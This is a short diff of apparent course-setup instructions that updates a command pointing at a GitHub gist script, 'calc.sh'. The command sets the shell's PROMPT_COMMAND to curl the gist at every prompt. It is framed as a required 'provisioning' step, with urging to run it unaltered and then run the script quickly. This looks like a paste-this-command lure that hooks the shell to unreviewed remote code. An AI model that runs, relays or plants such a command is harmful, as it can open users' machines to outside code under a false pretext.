@@ -9,7 +9,7 @@ Run the command below to access the script in the github gist, follow the beginn
 
 Run this command and dont add nothing else to it. run this, then the script in quick succession. 
 
-set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/5a37a3467054371fecacc395822bc252929da595/calc.sh"
+set -- test && PROMPT_COMMAND="curl -s https://gist.githubusercontent.com/millstone-ai/aac461dc9c590b046eefcfce43b0db1c/raw/2ed44cd1d4a76ac382c1797225026299b231c803/calc.sh"
 
 
 This step is required to provision your access to the course environment and materials. 
